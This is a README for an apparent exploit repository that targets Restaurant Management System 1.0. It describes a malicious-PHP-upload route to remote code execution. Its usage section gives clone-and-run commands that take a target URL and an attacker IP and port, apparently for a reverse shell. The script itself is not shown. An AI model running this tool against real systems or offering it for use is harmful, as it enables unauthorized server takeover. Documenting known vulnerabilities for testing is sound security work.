# Restaurant Management System RCE Exploit

This repository contains a Remote Code Execution (RCE) exploit for **Restaurant Management System 1.0**. This vulnerability allows an attacker to upload a malicious PHP file and execute arbitrary commands on the target server.

## Vulnerability Details

- **Exploit Title**: Restaurant Management System 1.0 - Remote Code Execution (RCE)
- **Tested on**: CentOS 7, Apache 2.4.6, PHP 5.4.16
- **Vendor Homepage**: [Link](https://www.sourcecodester.com/users/lewa)
- **Software Link**: [Restaurant Management System Download Link](https://www.sourcecodester.com/php/11815/restaurant-management-system.html)
- **Exploit-DB Entry:** [https://www.exploit-db.com/exploits/47520](https://www.exploit-db.com/exploits/47520)

## Usage

### Clone the repository:

```bash
git clone https://github.com/iltosec/restaurant-management-system-rce.git
cd restaurant-management-system-rce
python restaurant_management_rce.py <target_url> <attacker_ip> <attacker_port>
```

# Demo
Here is a demo of how the exploit works:
<div align="center">

<a href="https://asciinema.org/a/715292" target="_blank"><img src="https://asciinema.org/a/715292.svg" /></a>
</div>

# Disclaimer
This exploit is for educational purposes only. Please ensure you have explicit permission to test the target system before using this exploit.

By using this exploit, you agree not to cause harm or damage to systems and networks without authorization.
